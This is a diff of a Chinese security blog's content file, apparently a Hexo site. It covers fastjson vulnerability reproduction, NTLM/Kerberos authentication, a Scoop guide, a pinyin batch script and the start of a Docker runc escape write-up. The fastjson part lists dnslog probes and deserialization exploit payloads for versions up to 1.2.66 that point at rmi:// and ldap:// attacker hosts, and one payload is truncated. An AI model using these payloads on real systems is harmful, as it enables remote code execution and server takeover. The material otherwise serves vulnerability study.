-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145278.png" alt="image-20200704162844047"></p>
-<p>最终收到dnslog</p>
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312146617.png" alt="image-20200704162922529"></p>
-<h3 id="最新版本1-2-67依然可以通过dnslog判断后端是否使用fastjson"><a href="#最新版本1-2-67依然可以通过dnslog判断后端是否使用fastjson" class="headerlink" title="最新版本1.2.67依然可以通过dnslog判断后端是否使用fastjson"></a>最新版本1.2.67依然可以通过dnslog判断后端是否使用fastjson</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>畸形的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312146104.png" alt="img"></p>
-<p>POC:</p>
-<p>要嵌套在里面zeo里面</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br></pre></td></tr></table></figure>
-
-<h2 id="多版本payload集合"><a href="#多版本payload集合" class="headerlink" title="多版本payload集合"></a>多版本payload集合</h2><p>影响版本：</p>
-<h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson&lt;&#x3D;1.2.24"></a>fastjson&lt;&#x3D;1.2.24</h3><p>exp：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://x.x.x.x:1099/jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
-
-<p>影响版本：</p>
-<h3 id="fastjson-1"><a href="#fastjson-1" class="headerlink" title="fastjson&lt;&#x3D;1.2.41"></a>fastjson&lt;&#x3D;1.2.41</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）</p>
-<p>exp：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://x.x.x.x:1098/jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
-
-<p>影响版本：</p>
-<h3 id="fastjson-2"><a href="#fastjson-2" class="headerlink" title="fastjson&lt;&#x3D;1.2.42"></a>fastjson&lt;&#x3D;1.2.42</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）</p>
-<p>exp：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1399/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
-
-<p>影响版本：</p>
-<h3 id="fastjson-3"><a href="#fastjson-3" class="headerlink" title="fastjson&lt;&#x3D;1.2.43"></a>fastjson&lt;&#x3D;1.2.43</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）</p>
-<p>exp：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1399/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
-
-<p>影响版本：</p>
-<h3 id="fastjson-4"><a href="#fastjson-4" class="headerlink" title="fastjson&lt;&#x3D;1.2.45"></a>fastjson&lt;&#x3D;1.2.45</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）</p>
-<p>exp：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap://localhost:1399/Exploit&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>影响版本：</p>
-<h3 id="fastjson-5"><a href="#fastjson-5" class="headerlink" title="fastjson&lt;&#x3D;1.2.47"></a>fastjson&lt;&#x3D;1.2.47</h3><p>exp：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.Class&quot;, </span><br><span class="line">        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;, </span><br><span class="line">    &quot;b&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, </span><br><span class="line">        &quot;dataSourceName&quot;: &quot;ldap://x.x.x.x:1999/Exploit&quot;, </span><br><span class="line">        &quot;autoCommit&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>影响版本：</p>
-<h3 id="fastjson-6"><a href="#fastjson-6" class="headerlink" title="fastjson&lt;&#x3D;1.2.62"></a>fastjson&lt;&#x3D;1.2.62</h3><p>exp：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;rmi://127.0.0.1:1098/exploit&quot;&#125;&quot;</span><br></pre></td></tr></table></figure>
-
-<p>影响版本：</p>
-<h3 id="fastjson-7"><a href="#fastjson-7" class="headerlink" title="fastjson&lt;&#x3D;1.2.66"></a>fastjson&lt;&#x3D;1.2.66</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）</p>
-<p>exp：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransacti</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Scoop不完全上手指南</title>
     <url>/articles/e7aa9a12/</url>
     <content><![CDATA[<h2 id="scoop介绍"><a href="#scoop介绍" class="headerlink" title="scoop介绍"></a>scoop介绍</h2><blockquote>
@@ -743,6 +456,115 @@
       </tags>
   </entry>
   <entry>
+    <title>NTLM及Kerberos认证流程</title>
+    <url>/articles/60487e7c/</url>
+    <content><![CDATA[<h1 id="NTLM及Kerberos认证流程"><a href="#NTLM及Kerberos认证流程" class="headerlink" title="NTLM及Kerberos认证流程"></a>NTLM及Kerberos认证流程</h1><h2 id="NTLM认证"><a href="#NTLM认证" class="headerlink" title="NTLM认证"></a>NTLM认证</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h3><p>NTLM是NT LAN Manager的缩写，NTLM 是指 telnet 的一种验证身份方式，即问询&#x2F;应答身份验证协议，是 Windows NT 早期版本的标准安全协议，Windows 2000 支持 NTLM 是为了保持向后兼容。Windows 2000内置三种基本安全协议之一。</p>
+<h3 id="2-认证流程"><a href="#2-认证流程" class="headerlink" title="2.认证流程"></a>2.认证流程</h3><p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312047697.png" alt="Snipaste_2021-09-09_13-48-24"></p>
+<p>①使用用户名和密码登录客户端，进行<strong>本地认证</strong></p>
+<p>②客户端首先在本地加密当前用户的密码为密码散列，即<strong>NTLM Hash</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:1">1</a></p>
+<p>③确认双方协议版本，客户端向服务器明文发送自己的账号</p>
+<p>④服务器生成一个16位的随机数字发送给客户端，即<strong>challenge</strong></p>
+<p>⑤客户端使用<strong>NTLM Hash</strong>来加密<strong>challenge</strong>，生成的结果即<strong>response</strong></p>
+<p>⑥服务器将<strong>明文的用户名</strong>、<strong>challenge</strong>、<strong>response</strong>发给域控制器(DC)</p>
+<p>⑦域控制器用这个用户名在<strong>SAM密码管理库</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:2">2</a>中找到此用户对应的<strong>NTLM Hash</strong>，并使用这个值来加密<strong>challenge</strong>，生成的结果记为<strong>response2</strong></p>
+<p>⑧域控制器对<strong>response</strong>和<strong>response2</strong>进行比较，如果一样则认证成功，反之则失败</p>
+<h4 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h4><p>Windows不会储存用户的明文密码，而是将明文密码加密后储存在SAM中</p>
+<p>本地认证的过程中，用户登录时，系统会将用户输入的明文密码加密成<strong>NTLM Hash</strong>，然后和SAM中的<strong>NTLM Hash</strong>进行比较从而完成认证</p>
+<p>用户进行任何注销操作（注销登录，重启，锁屏等），<strong>winlogon</strong>进程会显示密码输入界面，接受用户输入密码后交给<strong>lsass</strong>进程，这个进程中会保存一份明文密码，然后加密成<strong>NTLM Hash</strong></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; 本地认证</span><br></pre></td></tr></table></figure>
+
+<h4 id="NTLM-Hash的生成"><a href="#NTLM-Hash的生成" class="headerlink" title="NTLM Hash的生成"></a>NTLM Hash的生成</h4><ul>
+<li>用户明文密码：<code>y5neko123</code></li>
+<li>十六进制转换为：<code>79356e656b6f313233</code></li>
+<li>转换为Unicode码，相当于在每个字节后添加一个0x00：<code>790035006e0065006b006f00310032003300</code></li>
+<li>以十六进制进行MD4加密：<code>2aec2647511a853cbec96388c4ae8770</code></li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312047362.png" alt="image-20210909131622932"></p>
+<h2 id="Kerberos认证"><a href="#Kerberos认证" class="headerlink" title="Kerberos认证"></a>Kerberos认证</h2><h3 id="1-概念-1"><a href="#1-概念-1" class="headerlink" title="1.概念"></a>1.概念</h3><p>Kerberos 是一种由 MIT（麻省理工大学）提出的一种网络身份验证协议。它旨在通过使用密钥加密技术为客户端&#x2F;服务器应用程序提供强身份验证。</p>
+<p>Kerberos 主要是用在域环境下的身份认证协议。</p>
+<h3 id="2-认证流程-1"><a href="#2-认证流程-1" class="headerlink" title="2.认证流程"></a>2.认证流程</h3><p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312047736.png" alt="img"></p>
+<p>Kerberos 协议中主要有四个角色的存在：</p>
+<ol>
+<li>访问服务的 Client</li>
+<li>提供服务的 Server</li>
+<li>KDC（Key Distribution Center）密钥分发中心<a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:3">3</a></li>
+<li>AD（Account Database）</li>
+</ol>
+<hr>
+<h4 id="KDC的构成"><a href="#KDC的构成" class="headerlink" title="KDC的构成"></a>KDC的构成</h4><p><strong>Authentication Service</strong>：认证服务器，以下简称AS，作用就是验证 Client 端的身份，验证通过会发送一张<strong>TGT（Ticket Granting Ticket）</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:4">4</a>票据给 Client</p>
+<p><strong>Ticket Granting Service</strong>：票据分发服务器，以下简称TGS，作用是通过 AS 发送给 Client 的票据（TGT）换取<strong>ST（ServiceTicket</strong>）<a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:5">5</a>，也被称为<strong>TGS Ticket</strong></p>
+<hr>
+<p>Kerberos认证大体上分为三个流程：</p>
+<ol>
+<li>The Authentication Service Exchange：Client 与 AS 的交互</li>
+<li>The Ticket-Granting Service (TGS) Exchange：Client 与 TGS 的交互</li>
+<li>The Client&#x2F;Server Authentication Exchange：Client 与 Server 的交互</li>
+</ol>
+<hr>
+<h4 id="一、Authentication-Service-Exchange"><a href="#一、Authentication-Service-Exchange" class="headerlink" title="一、Authentication Service Exchange"></a>一、Authentication Service Exchange</h4><p><strong>KRB_AS_REQ（请求）</strong></p>
+<p>Client –&gt; AS：客户端向KDC的AS发送<strong>Authenticator1</strong>，内容包含：</p>
+<ul>
+<li>Pre-authentication data：包含用以证明自己身份的信息，一般它的内容是一个被Client hash加密过的时间戳</li>
+<li>Client name &amp; realm：用户信息</li>
+<li>TGS的Server name</li>
+</ul>
+<p><strong>KRB_AS_REP（响应）</strong></p>
+<p>AS –&gt; Client：AS根据用户名在AD中判断是否在白名单中，接着进行验证发送方是否为Client name中声称的用户</p>
+<p>也就是需要验证发送方是否知道该用户名的密码，此时只需要从AD中使用相应的<strong>NTLM Hash</strong>对请求包中的<strong>Pre-authentication data</strong>进行解密，如果是一个合法的时间戳，则说明提供的密钥无误</p>
+<p>验证成功后提取相应的<strong>NTLM Hash</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:1">1</a>，此时会生成一个随机数<strong>SessionKey</strong>，然后使用提取的<strong>NTLM Hash</strong>来加密<strong>SessionKey</strong>，生成<strong>SessionKey-as</strong>作为AS数据，再返回一个<strong>TGT</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:4">4</a></p>
+<blockquote>
+<p>  简述：在 KDC(AD) 中存储了域中所有用户的密码 HASH，当 AS 接收到 Client 的请求之后会根据 KDC 中存储的密码来解密，解密成功并且验证信息，验证成功后返回给Client两个数据，由 Client 密码 HASH 加密的SessionKey-as和TGT。</p>
+</blockquote>
+<p>Client收到KRB_AS_REP，通过自己的<strong>NTLM Hash</strong>对返回的<strong>SessionKey-as</strong>进行解密得到<strong>SessionKey</strong>后，即可携带<strong>TGT</strong>进入下一步骤</p>
+<hr>
+<h4 id="二、Ticket-Granting-Service-TGS-Exchange"><a href="#二、Ticket-Granting-Service-TGS-Exchange" class="headerlink" title="二、Ticket-Granting Service (TGS) Exchange"></a>二、Ticket-Granting Service (TGS) Exchange</h4><p><strong>KRB_TGS_REQ（请求）</strong></p>
+<p>Client –&gt; TGS：Client向KDC的TGS发送<strong>Authenticator2</strong>，内容包含：</p>
+<ul>
+<li>TGT</li>
+<li>Authenticator：用以证明当初TGT的拥有者是自己，使用SessionKey来进行加密，其中包含有客户端信息和时间戳</li>
+<li>Client name &amp; realm</li>
+<li>Server name &amp; realm：Client要访问的Server</li>
+</ul>
+<p><strong>KRB_TGS_REP（响应）</strong></p>
+<p>TGS –&gt; Client：TGS首先通过自己的NTLM Hash（krbtgt账户的NTLM Hash）对Client提供的TGT进行解密，即可得到<strong>SessionKey</strong>，再通过这个SessionKey解密Client提供的<strong>Authenticator</strong>来进行验证，此时生成一个<strong>SessionKey-tgs</strong></p>
+<p>验证成功后向对方发送两个数据：</p>
+<ul>
+<li>使用SessionKey加密<strong>SessionKey-tgs</strong>生成<strong>SessionKey-tgs-encrypt</strong>，用于Client和Server的认证</li>
+<li>使用Server的NTLM Hash加密<strong>SessionKey-tgs</strong>生成<strong>ST</strong><a href="https://note.ysneko.com/blog/lan_ntlm_kerberos.html#fn:5">5</a></li>
+</ul>
+<p>Client收到KRB_TGS_REP，使用SessionKey对返回的<strong>SessionKey-tgs-encrypt</strong>进行解密得到<strong>SessionKey-tgs</strong>，有了<strong>SessionKey-tgs</strong>和<strong>ST</strong>，Client就可以和Server交互了，至此TGS的任务完成</p>
+<hr>
+<h4 id="三、Client-Server-Authentication-Exchange"><a href="#三、Client-Server-Authentication-Exchange" class="headerlink" title="三、Client&#x2F;Server Authentication Exchange"></a>三、Client&#x2F;Server Authentication Exchange</h4><p><strong>KRB_AP_REQ（请求）</strong></p>
+<p>Client –&gt; Server：Client向Server发送<strong>Authenticator3</strong>，内容包含：</p>
+<ul>
+<li>ST</li>
+<li>Authenticator：用以证明当初TGT的拥有者是自己，使用SessionKey来进行加密，其中包含有客户端信息和时间戳</li>
+<li>Flag：用于表示Client是否需要进行双向验证</li>
+</ul>
+<p><strong>KRB_AP_REP（响应）</strong></p>
+<p>Server –&gt; Client：Server首先通过自己的NTLM Hash对收到的ST进行解密，即可得到<strong>SessionKey-tgs</strong>，再通过这个<strong>SessionKey-tgs</strong>解密收到的<strong>Authenticator</strong>即可验证身份，原理同上</p>
+<p>此时连接建立成功。</p>
+<blockquote>
+<p>  对于需要进行双向验证，Server从Authenticator提取Timestamp，使用**SessionKey(Server-Client)**进行加密，并将其发送给Client用于Client验证Server的身份。</p>
+</blockquote>
+<hr>
+<ol>
+<li>通常意义上的NTLM Hash指存储在SAM数据库及NTDS数据库中对密码进行 Hash摘要计算后的结果，这类 Hash可以直接用于 PTH，并且通常存在于LSASS进程中，便于 SSP（NTLM 安全支持提供程序）使用。 Account Manager Database，安全账号管理数据库 [</li>
+<li>KDC 服务默认会安装在一个域的域控中，KDC 服务框架中包含一个 KRBTGT 账户，它是在创建域时系统自动创建的一个账号，是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。</li>
+<li>TGT包含：使用KDC中krbtgt账户的NTLM Hash加密的SessionKey、Client name &amp; realm以及End Time：TGT的到期时间</li>
+<li>可以用来访问 Server 端的票据，包含：SessionKey-tgs、Client name &amp; realm以及End Time：ST的到期时间</li>
+</ol>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>知识库</category>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Windows下快速切换全拼/双拼</title>
     <url>/articles/d4db3d41/</url>
     <content><![CDATA[<h1 id="Windows下快速切换全拼-双拼"><a href="#Windows下快速切换全拼-双拼" class="headerlink" title="Windows下快速切换全拼&#x2F;双拼"></a>Windows下快速切换全拼&#x2F;双拼</h1><h2 id="bat批处理文件方式"><a href="#bat批处理文件方式" class="headerlink" title="bat批处理文件方式"></a>bat批处理文件方式</h2><h3 id="change-bat"><a href="#change-bat" class="headerlink" title="change.bat"></a>change.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS </span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>) </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg ( reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x1 /f ) <span class="keyword">else</span> ( reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x0 /f )</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>
@@ -919,261 +741,173 @@
       </tags>
   </entry>
   <entry>
-    <title>CVE-2019-5736-Docker逃逸RunC漏洞复现</title>
-    <url>/articles/de574863/</url>
-    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p> Docker 是一个开源的应用容器引擎，基于Go 语言并遵从Apache2.0协议开源。 Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到 Linux 或 Windows 机器上，也可以实现虚拟化。 因为Docker容器是完全使用沙箱机制，Docker逃逸漏洞便成了Docker的漏洞主要利用方式之一。</p>
-<p> Docker逃逸RunC漏洞，在Docker 18.09.2之前的版本中使用了的RunC版本小于1.0-rc6，允许攻击者重写宿主机上的RunC 二进制文件,  从而使得宿主机以root执行命令，从而获取宿主机控制权限。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290912214.jpg" alt="img"></p>
-<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><hr>
-<blockquote>
-<p>  漏洞是指应用软件或操作系统软件在逻辑设计上的缺陷或在编写时产生的错误，这个缺陷或错误可以被不法者或者电脑黑客利用，通过植入木马、病毒等方式来攻击或控制整个电脑，从而窃取电脑中的重要资料和信息，甚至破坏系统。现代化的社会发展为人们设计了自由、共享的网络环境，这促使人们的生活、工作以及学习得到了有效改善，也为网络安全漏洞问题的突显提供了平台。</p>
+    <title>fastjson漏洞复现</title>
+    <url>/articles/602d9e2a/</url>
+    <content><![CDATA[<h1 id="fastjson漏洞复现"><a href="#fastjson漏洞复现" class="headerlink" title="fastjson漏洞复现"></a>fastjson漏洞复现</h1><blockquote>
+<p>  Fastjson是一个Java库，可用于将Java对象转换为其JSON表示形式。它还可以用于将JSON字符串转换为等效的Java对象,fastjson爆出多个反序列化远程命令执行漏洞，攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。</p>
 </blockquote>
-<h3 id="Docker逃逸RunC漏洞"><a href="#Docker逃逸RunC漏洞" class="headerlink" title="Docker逃逸RunC漏洞"></a>Docker逃逸RunC漏洞</h3><hr>
-<blockquote>
-<p>  CVE-2019-5736是2019年2月11日在oss-security邮件列表披露的runc容器逃逸漏洞。</p>
-<p>  在Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc 二进制文件，因此可以感觉以root的身份执行命令，导致获得宿主机的root权限。</p>
-<p>  利用方式：</p>
-<ol>
-<li>宿主机利用攻击者提供的image来创建一个新的container 。或</li>
-<li>拥有container root权限，并且该container后续被docker exec attach。</li>
-</ol>
-<p>   一句话描述，docker 18.09.2之前的runc存在漏洞，攻击者可以修改runc的二进制文件导致提权。</p>
-<p>   影响：</p>
-<ul>
-<li>docker version &lt;&#x3D;18.09.2 （然而实际测试的结果是docker version 18.09.1失败）</li>
-<li>RunC version &lt;&#x3D;1.0-rc6</li>
-</ul>
-</blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290915562.jpg-w331s" alt="docker6"></p>
-<h2 id="相关工具及技术"><a href="#相关工具及技术" class="headerlink" title="相关工具及技术"></a>相关工具及技术</h2><h3 id="Vmware-Workstation"><a href="#Vmware-Workstation" class="headerlink" title="Vmware Workstation"></a>Vmware Workstation</h3><hr>
-<p>VMware Workstation使专业技术人员能够在同一台 PC上同时运行多个基于 x86 的 Windows、Linux 和其他操作系统，从而开发、测试、演示和部署软件。</p>
-<p>借助 VMware Workstation Pro，您可以将多个操作系统作为虚拟机（包括 Windows 虚拟机）在单台 Windows 或 Linux PC 上运行，VMware Workstation Pro 是将多个操作系统作为虚拟机 (VM) 在单台 Linux 或 Windows PC 上运行的行业标准。为任何设备、平台或云环境构建、测试或演示软件的 IT 专业人员、开发人员和企业都可以使用，可大大提升工作效率的高性能工具。开发人员将获得一个扩展性强的工程设计环境。</p>
-<p>VMware Workstation 可在一部实体机器上模拟完整的网络环境，以及可便于携带的虚拟机器，其更好的灵活性与先进的技术胜过了市面上其他的虚拟计算机软件。对于企业的 IT开发人员和系统管理员而言， VMware 在虚拟网路，实时快照，拖曳共享文件夹，支持 PXE 等方面的特点使它成为必不可少的工具。</p>
-<p>VMware Workstation 允许操作系统和应用程序在一台虚拟机内部运行。虚拟机是独立运行主机操作系统的离散环境。在 VMware Workstation 中，可以在一个窗口中加载一台虚拟机，它可以运行自己的操作系统和应用程序。可以在运行于桌面上的多台虚拟机之间切换，通过一个网络共享虚拟机，挂起和恢复虚拟机以及退出虚拟机，这一切不会影响你的主机操作和任何操作系统或者其它正在运行的应用程序。</p>
-<h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><hr>
-<p>Ubuntu是一个以桌面应用为主的<strong>Linux</strong>操作系统，其名称来自非洲南部祖鲁语或豪萨语的“<strong>ubuntu</strong>“一词，意思是“人性”“我的存在是因为大家的存在”，是非洲传统的一种价值观。Ubuntu基于<strong>Debian</strong>发行版和Gnome桌面环境，而从11.04版起，Ubuntu发行版放弃了<strong>Gnome</strong>桌面环境，改为Unity。从前人们认为Linux难以安装、难以使用，在Ubuntu出现后这些都成为了历史。Ubuntu也拥有庞大的社区力量，用户可以方便地从社区获得帮助。</p>
-<h3 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h3><hr>
-<p>Kali Linux 是一个基于Debian 的Linux 版本 ,面向专业的渗透测试和安全审计。可以把它理解为一个特殊的Linux发行版，集成了超过了600种精心挑选的渗透测试的工具(如 <strong>Metasploit FrameWork</strong> , <strong>Nmap</strong>等)，供渗透测试和安全设计人员使用，也可称之为平台或者框架。</p>
-<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><hr>
-<p>Docker 是一个开源的应用容器引擎，基于Go 语言并遵从Apache2.0协议开源,项目主要代码在2013年开源于 GitHub。它是云服务技术上的一次创新，让应用程序布署在软件容器下的工作可以自动化进行，借此在 Linux 操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。</p>
-<p>Docker 利用 Linux 核心中的资源分脱机制，例如 cgroups， Linux 核心名字空间（name space），以及AUFS类的UnionFS等技术，对进程进行封装隔离，属于操作系统层面的虚拟化技术。由于隔离的进程独立于宿主和其它的隔离的进程，因此也称其为容器。Docker 在容器的基础上进行了进一步的封装，从文件系统、网络互联到进程隔离等等，极大的简化了容器的创建和维护，使得其比虚拟机技术更为轻便、快捷。Docker 可以在单一 Linux 实体下运作，避免因为创建一个虚拟机而造成的额外负担。传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程；而容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核，而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便。</p>
-<p>Docker 和传统虚拟机对比，具有更快的启动速度、更高效的资源利用率、更高的系统支持量、持续交付与部署、更轻松的迁移、更轻松的维护与扩展等优点。</p>
-<p>Docker Hub是Docker提供的一项服务，用于寻找和共享容器镜像。它是世界上最大的容器映像库，其内容来源包括容器社区开发者、开源项目和独立软件供应商（ISV）在容器中构建和发布他们的代码。它是一个在线存储库，Docker 镜像可以由其他用户发布和使用。</p>
-<h4 id="Docker常用命令"><a href="#Docker常用命令" class="headerlink" title="Docker常用命令"></a>Docker常用命令</h4><p><strong>dockr images</strong>           列出本地镜像</p>
-<p><strong>docker ps</strong>             查看当前运行的容器</p>
-<p><strong>docker ps -a</strong>            查看全部容器</p>
-<p><strong>docker pull  NAME[:TAG]</strong>     从镜像仓库中拉取或者更新指定镜像</p>
-<p><strong>docker restart  container_id</strong>     重启容器</p>
-<p><strong>docker build -f Dockerfile_PATH</strong>   docker build 命令用于使用 Dockerfile 创建镜像。</p>
-<p><strong>docker run [OPTIONS] IMAGE [COMMAND] [ARG…]</strong></p>
